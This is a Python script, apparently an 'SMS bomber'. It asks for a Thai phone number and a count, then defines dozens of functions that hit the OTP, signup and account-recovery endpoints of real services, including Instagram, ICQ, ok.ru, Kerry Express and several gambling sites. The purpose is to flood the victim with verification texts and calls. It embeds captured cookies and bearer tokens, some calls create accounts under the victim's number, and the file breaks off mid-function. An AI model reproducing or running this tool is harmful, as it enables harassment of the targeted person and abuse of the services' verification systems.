import requests,json
import threading
from threading import Thread
import time
import colorama
import platform
import os
from requests import Session
from requests import get
from requests import post
from re import search
from bs4 import BeautifulSoup as bs
import requests as ru

def clear():
    so_name=platform.system()
    if so_name=='Windows':
        os.system('cls')
    else:
        os.system('clear')
clear()

print("") 
print("""WUTch""")

print("BROKEN XD")
print("phone number : เบอร์")
print("number : จำนวน")
print("")
phone = input("\033[1;32mPHONE NUMBER\033[1;37m:\033[0;32m ")
number = int(input("\033[1;32mNUMBER \033[1;37m:\033[0;32m "))
clear()

def api1():
	requests.post("https://www.theconcert.com/rest/request-otp",json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"})
	
def api2():
    send = Session()
    send.headers.update({"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type" : "application/x-www-form-urlencoded","Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
    snd = send.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data=f"st.r.phone=+66{phone[1:]}")
    sed = send.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data="st.r.fieldAcceptCallUIButton=Call")
    
def api3():
	requests.post("https://api.zaapi.co/api/store/auth/otp/login",json={"phoneNumber":f"+66{phone[1:]}","namespace":"zaapi-buyers"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
		
def api4():
	head = {
	    "Host": "icq.com",
	    "Connection": "keep-alive",
	    "Accept": "application/json, text/javascript, */*; q=0.01",
	    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
	    "X-Requested-With": "XMLHttpRequest",
	    "sec-ch-ua-mobile": "?1",
	    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "sec-ch-ua-platform": "Android",
	    "Sec-Fetch-Site": "same-origin",
	    "Sec-Fetch-Mode": "cors",
	    "Sec-Fetch-Dest": "empty",
	    "Referer": "https://icq.com/login/",
	    "Cookie": "_ga=GA1.2.1621707397.1646539138; _gid=GA1.2.297898894.1646539138; tmr_lvid=9e111ca0bdfa20ce32ecfc30164fe745; tmr_lvidTS=1646539138109; tmr_detect=0%7C1646539140922; tmr_reqNum=3; user_tracking=34f0c4af712c38eccf984ee9db9fe62b; _gat=1; mr1lad=622451c76dc2ce79-300-300-"
	    }
	requests.post("https://icq.com/smscode/login/ru",headers=head,data=f"msisdn=66{phone[1:]}")
		
def api5():
	headers = {
	    "content-type": "application/x-www-form-urlencoded",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
	    "cookie": "_gcl_au=1.1.1123274548.1637746846"
	    }
	requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0")
		
def api6():
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	
def api7():
	requests.post("http://b226.com/x/code", data={f"phone":phone})
	
def api8():
	requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
		
def api9():
	requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-{phone}")
	
def api10():
	requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})
	
def api11():
	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json 
	
def api12():
	requests.post("https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/"+phone)
	
def api13():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
		
def api14():
	head = {
	    "content-type": "application/json;charset=UTF-8",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "accept": "application/json, text/plain, */*",
	    "referer": "https://www.carsome.co.th/sell-car?gclsrc=aw.ds&&&utm_source=Google&utm_medium=Search&utm_campaign=TH_C2B_Valuation_SmartPhrase_Core_&utm_term=Search_Core_C2B_TH_Perf_Conv_&utm_content=%E0%B8%A3%E0%B8%96%E0%B8%A1%E0%B8%B7%E0%B8%AD%E0%B8%AA%E0%B8%AD%E0%B8%87%E0%B8%A3%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%96%E0%B8%B9%E0%B8%81&gclid=Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB",
	    "cookie": "_gcl_au=1.1.1272461332.1638187764;G_ENABLED_IDPS=google;_ga=GA1.3.808434087.1638187769;__lt__cid=10b9db7a-fed7-4a04-99d2-cdf99ccd76b8;_gid=GA1.3.1113186157.1639742520;_fbp=fb.2.1639742521800.1608632439;ajs_anonymous_id=fc77ca54-b140-4d14-a811-9be694d4dcfa;_hjSessionUser_1895262=eyJpZCI6IjJmYTg1NjkzLTIwYWUtNTQ3ZC1iYTgyLTZjMTZhNDE4N2VjOSIsImNyZWF0ZWQiOjE2Mzk3NDI1MjIzMDAsImV4aXN0aW5nIjp0cnVlfQ==;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;panoramaId_expiry=1640349594875;panoramaId=052fccf0cccc27f1f255389082ee16d53938c5a780adb183ac3642512b6c17dc;_clck=18ofz7k|1|exd|0;skylab_deviceId=IuD7oBeC61H6n41Z1FH3ek;_gcl_aw=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gcl_dc=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;amp_893e6b=IuD7oBeC61H6n41Z1FH3ek...1fn7egd40.1fn7egjki.1.3.4;__lt__sid=f6ad8bda-06d0796d;_gac_UA-70043720-5=1.1639853872.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gat_UA-70043720-5=1;_uetsid=23e4ae005f3111ec8d8c79ffb5e7c09b;_uetvid=33f5ca20510d11ec8e1175a84efe64f8;_hjSession_1895262=eyJpZCI6IjY2YWZlZmI0LWMwMDYtNGFkMS1hMWE3LTQ3NDllYmQ2MDNjYSIsImNyZWF0ZWQiOjE2Mzk4NTM4NzU4MDd9;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjIncludedInSessionSample=0;_clsk=15fms60|1639853877001|1|1|e.clarity.ms/collect"
	    }
	requests.post("https://www.carsome.co.th/website/login/sendSMS", headers=head, json={"username":phone,"optType":0}).json()
	
def api15():
	head = {
	    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..o2KGFaI9sj29aEhCf9hApg.8hkBGU4xqfvuMOjMnNVDZjwqkjUcapX7Nnm4r5NZ-LsHH54KqovZT8OcwskjsUoh0_8NKc7aBicXTwiVy-yR_lly-2hWlWsxCG8cR-ucaKrjhJPzHMoLHdw8TKNeeIq5kGuyTsmB-WVAxDn7G5-v0Q.RkQDS8sYQYMpTilU1VOz1A",
	    "content-type": "application/json; charset=utf-8",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "accept": "*/*",
	    "referer": "https://nocnoc.com/login",
	    "cookie": "_gcl_au=1.1.2015626896.1637433514;_ga=GA1.2.2121914407.1637433515;__lt__cid=4ba7a030-4806-44f7-b0bc-eb65b3b9b13f;_fbp=fb.1.1637433519859.82249249;_hjSessionUser_1027858=eyJpZCI6IjExYjI1OTM1LWExZmItNTNjZS1hN2RlLTc4YmQwMjQzNmRkZCIsImNyZWF0ZWQiOjE2Mzc0MzM1MTkwMjUsImV4aXN0aW5nIjp0cnVlfQ==;ajs_anonymous_id=%22b70a4a48-dc6e-407c-9a31-37cb925d24e0%22;__lt__sid=dfc427cb-21404fe4;_gid=GA1.2.1348859339.1639856210;_gat_gaTracker=1;_hjSession_1027858=eyJpZCI6Ijk5MWY0ZjhlLTI0MjAtNDA2YS05MjM0LTJkYTliMzU4OTBkYyIsImNyZWF0ZWQiOjE2Mzk4NTYyMTIyNzV9;_hjIncludedInSessionSample=0;_hjAbsoluteSessionInProgress=0;cto_bundle=hwhaQ19FRiUyRlI5b0h0T1B5YlBlUG1YQzBEWmlxUDhqWDNBT3Qyc0hKVXBsJTJCazNaUlJFMHVMem5DMEh3OEJYUFNnWUI1MGhiSGVkOG9ab3NoUjNMbSUyRnpUd2N4SWU3Q1lnYkZvUnZsJTJGZTVveldmRWliWW5SYWhrJTJCbkxNTmhOaFBSOGNrQlhDRmUwQVpaVW41Q3ElMkJ0Yk9yNVJjVGclM0QlM0Q;_gat_UA-124531227-1=1"
	    }
	requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684",headers=head,json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone":phone,"type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName":"ฟงฟง ฟงฟว"}})
	
def api16():
	requests.post("https://www.monomax.me/api/v2/signup/telno",json ={"password":"12345678+","telno": phone})
	
def api17():
	requests.post("https://\033[31mยิงแล้งน้อง/api/register-otp",json ={"brands_id":"60e4016f35119800184f34a5","agent_register":"60e57c3b2ead950012fc5fba","tel": phone})
	
def api18():
	requests.post("https://www.som777.com/api/otp/register",json ={"applicant": phone,"serviceName":"SOM777"})
	
def api19():
	requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
	
def api20():
	requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})
	
def api21():
	requests.post("https://login.s-momclub.com/accounts.otp.sendCode", data=f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"})
	
def api22():
	requests.post("https://globalapi.pointspot.co/papi/oauth2/signinWithPhone",json={"phoneNumber":"+66"+phone},headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36"})
	
def api23():
	requests.get(f"https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile={phone}")
	
def api24():
	requests.post("https://www.bigthailand.com/authentication-service/user/OTP", json={"locale":"th","phone": f"+66{phone[1:]}","email":"dkdk@gmail.com","userParams":{"buyerName":"ekek ks","activateLink":"www.google.com"}},headers={"content-type": "application/json","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg","cookie": "auth.strategy=local;auth._token.local=Bearer%20eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg;_utm_objs=eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6InJlZmVycmVyIiwidGlt%0D%0AZSI6MTY0MjMyOTM5OTU4NSwiY2hlY2tzdW0iOiJaMjl2WjJ4bExXTndZeTFoWkhkdmNtUnpMVEUy%0D%0ATkRJek1qa3pPVGsxT0RVPSJ9;_pk_ref.564990563.2c0e=%5B%22%22%2C%22%22%2C1642329400%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D;_pk_ses.564990563.2c0e=*;_gcl_au=1.1.833577636.1642329400;_asm_visitor_type=n;_ac_au_gt=1642329406505;cdp_session=1;_asm_uid=637506384;_ga=GA1.2.1026893832.1642329403;_gid=GA1.2.1437369318.1642329403;OptanonConsent=isIABGlobal=false&datestamp=Sun+Jan+16+2022+17%3A36%3A45+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.9.0&hosts=&consentId=e0fe7ec6-3c1e-4aa7-9e72-ecd2ed724416&interactionCount=0&landingPath=https%3A%2F%2Fwww.bigthailand.com%2Fcategory%2F850%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2581%25E0%25B8%25A5%25E0%25B8%25B0%25E0%25B8%2582%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2580%25E0%25B8%25AB%25E0%25B8%25A5%25E0%25B8%25A7%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%3Fgclid%3DCj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0007%3A1;_fbp=fb.1.1642329406623.363807498;_hjSessionUser_2738378=eyJpZCI6ImVkNmZhOGY3LTQwNDctNTNjMi04YTVjLTQ0OGE5MDA4YjhiZCIsImNyZWF0ZWQiOjE2NDIzMjk0MDQ4MDMsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample=0;_hjSession_2738378=eyJpZCI6ImNhN2UwZDFhLTZkNmQtNGM0Mi04YmI1LTg4NWJmNzZjMGExZCIsImNyZWF0ZWQiOjE2NDIzMjk0MTEwNzcsImluU2FtcGxlIjpmYWxzZX0=;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_gac_UA-165856282-1=1.1642329477.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_gcl_aw=GCL.1642329478.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_pk_id.564990563.2c0e=0.1642329400.1.1642329489.1642329400.;_ac_client_id=637515726.1642329496;_ac_an_session=zmzlzhzlzizqzmzjzkzjzdzlzgzkzmzizmzkzhzlzdzizlznzhzgzhzqznzqzlzdzizdzizlznzhzgzhzqznzqzlzdzizlznzhzgzhzqznzqzlzdzizdzgzjzizdzjzd2h25zdzgzdzezizd;au_id=637515726;_ga_80VN88PBVD=GS1.1.1642329399.1.1.1642329493.44"})
	
def api25():
	requests.post("https://api.cashmarket-th.com/app/userinfo/send/smsCode", json={"baseParams":{"platformId":"android","deviceType":"h5","deviceIdKh":"20220118121149smyjjs57jxtqbwkuu74y0vd6p5yzhrmp86872f73364d46d3bf9446ddd583ef61ee8fafe504bab46ec267ca96a99281d6rreqhrlgsg4p3srgv1i5s4pp8u9la6gf1","termSysVersion":"5.1.1","termModel":"A37f","brand":"","termId":"null","appType":"6","appVersion":"2.0.0","pValue":"","position":{"lon":"null","lat":"null"},"bizType":"0000","appName":"Cash Market","packageName":"com.cashmarketth.h5","screenResolution":"720,1280"},"clientTypeFlag":"h5","token":"","phoneNumber":"","timestamp":"1642479101529","bizParams":{"phoneNum":phone,"code":"null","type":200,"channelCode":"hJ071"}})
	
def api26():
	requests.post("https://bacara888.com/api/otp/register",json={"applicant":phone,"serviceName":"gclub"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","cookie":"_ga=GA1.2.600445810.1648202009;_gid=GA1.2.1634649368.1648202009;PHPSESSID=ehi2ceis3aph6d46ktk0819435;_gat_gtag_UA_136950045_1=1"})
	
def api27():
	requests.post("https://api.cdfoi9.com/api/v1/index.php", data=f"module=%2Fusers%2FgetVerificationCode&mobile={phone}&merchantId=111&domainId=0&accessId=&accessToken=&walletIsAdmin=",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded"})
		
def api28():
	requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2")
	
def api29():
	requests.post("https://www.theconcert.com/rest/request-otp",json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;lang=th;_ga=GA1.2.2049889473.1646798264;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646798488.0;adonis-session=44628ab9b6ca838df7cae56fd8002ae3gHvO1Y2HO%2FqTGzfg%2BPTrGUMCIyvUovjtojnUXwV3Zkad8%2FiHkyPtRDw22XxTu%2FKThnfLNB66Y7ZpXkn%2F62119z4KQ%2Fdq%2FDtJ7UDgYuXS3ZRX7peyrLnbwlhK3F6qs8Dz;XSRF-TOKEN=6fc17e57b0a1aa3a6ba6f08a6b5f86f0dCGKD%2BakNpM1hqLLDCGjgfv17OQuobSfvf5OV9DUnOmGg5hhkRVkPFeQZmOA9QNQ1wD3zJYeRD0PSvtM5Z7uIY2aJvR%2F9qmEeUIQTRHz5i10%2BRkgm9wsq4xKA%2Bzg6WFY"})
	  
def api30():
	head = {
	    "Host": "shopgenix.com",
	    "content-length": "37",
	    "sec-ch-ua-mobile": "?1",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	    "x-requested-with": "XMLHttpRequest",
	    "sec-ch-ua-platform": "Android",
	    "accept": "application/json, text/javascript, */*; q=0.01",
	    "origin": "https://shopgenix.com",
	    "referer": "https://shopgenix.com/app/5364874/",
	    "sec-fetch-site": "same-origin",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-dest": "empty"
	    }
	requests.post("https://shopgenix.com/api/sms/otp/",headers=head,data=f"mobile_country_id=1&mobile={phone}")
	
def api31():
	head = {
	    "x-requested-with": "XMLHttpRequest",
	    "accept": "application/json, text/javascript, */*; q=0.01",
	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "referer": "https://ufa3bb.com/account/register",
	    "cookie": "_ga=GA1.2.1794924533.1639040857;ci_session=alj35so836p0d39gckneiqsuql03193n"
	    }
	requests.post("https://ufa3bb.com/account/register/sendotp",headers=head,data=f"phone={phone}")
		
def api32():
	head = {
	    "Host": "users.cars24.co.th",
	    "x_vehicle_type": "CAR",
	    "accept": "application/json, text/plain, */*",
	    "sec-ch-ua-mobile": "?1",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "x_country": "TH",
	    "sec-ch-ua-platform": "Android",
	    "origin": "https://www.cars24.co.th",
	    "sec-fetch-site": "same-site",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-dest": "empty",
	    "referer": "https://www.cars24.co.th/",
	    "cookie": "_ga=GA1.3.31251861.1643986646;_gaexp=GAX1.3.PDQKIJpORiqz3sQ-b-n6dg.19097.1!6d55AMaSQSeBR3ISG4OEXQ.19110.1;_fbp=fb.2.1643986648656.1241126413;_gid=GA1.3.1399625525.1644221421;_dc_gtm_UA-65843992-28=1;_gat_UA-65843992-28=1;_hjSessionUser_2738441=eyJpZCI6IjY4OGUyODNkLTgxYzYtNTY5YS04ODMxLTFmMDY4N2I1YmVhMSIsImNyZWF0ZWQiOjE2NDM5ODY2NDcxOTAsImV4aXN0aW5nIjp0cnVlfQ==;_hjSession_2738441=eyJpZCI6IjBjNWQ3MDYxLTVlMmUtNGI2My1iMWFjLWVkNmY0OTIzNDI4ZiIsImNyZWF0ZWQiOjE2NDQyMjE0MjU4MDEsImluU2FtcGxlIjpmYWxzZX0=;_hjAbsoluteSessionInProgress=1;cto_bundle=jGdn019OJTJGRDNwa052ajI1cjBrT0JkeXJEVkxSOWM3NzF5RkpkbHhma3VwZ3NsM3YzOGpISVBsUyUyRm9UJTJCRSUyQkY2dThHQVFQd0VnWXE1MyUyRldHbnQlMkIwOHFzcFN2UFVtb0hmVnI4aTdZYUcyUHBBVG0lMkZRMnRVQjh5N2l5UnNGOG02SXlOOTg0MVVLeUxlNHBKZXFFUmVuRWFsUEFlZyUzRCUzRA",
	    }
	requests.get(f"https://users.cars24.co.th/oauth/consumer-app/otp/{phone}?lang=th",headers=head)
	
def api33():
	requests.post("https://api.thaisme.one/smegp/register/request-otp",json={"MOBILE":phone})
	
def api34():
	requests.post("https://app.droprich.co/agent/registergetsmsotp",data=f"phonenumber={phone}",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})
	
def api35():
	head = {
	    "Host": "gateway-sport.autoplay.cloud",
	    "content-length": "34",
	    "accept": "application/json",
	    "content-type": "application/json",
	    "sec-ch-ua-mobile": "?1",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "sec-ch-ua-platform": "Android",
	    "origin": "https://sport.autoplay.cloud",
	    "sec-fetch-site": "same-site",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-dest": "empty",
	    "referer": "https://sport.autoplay.cloud/"
	    }
	requests.post("https://gateway-sport.autoplay.cloud/iamrobot/frontend/user/send-otp",headers=head,json={"tel":phone,"prefix":"G8"})
	
def api36():
	requests.post("https://apiv3.slot999ss.com/front/api/register/set/OTP",data=f"phone={phone}",headers={"content-type": "application/x-www-form-urlencoded;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
	
def api37():
	head = {
	    "Host": "id.zilingo.com",
	    "content-length": "153",
	    "accept": "application/json, text/plain, */*",
	    "content-type": "application/json",
	    "x-requested-with": "XMLHttpRequest",
	    "sec-ch-ua-mobile": "?1",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "sec-ch-ua-platform": "Android",
	    "origin": "https://id.zilingo.com",
	    "sec-fetch-site": "same-origin",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-dest": "empty",
